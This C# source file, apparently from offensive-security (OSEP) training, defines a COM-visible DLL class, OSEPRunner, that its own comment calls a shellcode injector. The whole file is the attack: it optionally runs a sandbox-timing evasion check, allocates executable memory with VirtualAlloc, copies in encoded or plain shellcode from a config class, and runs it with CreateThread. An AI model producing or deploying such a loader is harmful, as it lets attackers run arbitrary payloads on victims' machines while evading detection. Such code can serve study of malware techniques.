//Generates a DLL that can exports the OSEPRunner class. OSEPRunner is just a shellcode injector.
//Load the DLL and invoke OSEPRunner


using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace OSEP
{ 

    [ComVisible(true)]
    public class OSEPRunner
    {

        //IMPORT WIN32 API FUNCTIONS
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);



        public OSEPRunner()
        {
            
            if (CONFIG.DETECT_SANDBOX_TIME)
                Evasion.SandboxTimeDetect(2000);

            int size = CONFIG.SHELLCODE.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            if (CONFIG.ENCODED == true)
                Marshal.Copy(Evasion.Decode(CONFIG.SHELLCODE), 0, addr, size);
            else
                Marshal.Copy(CONFIG.SHELLCODE, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }

}

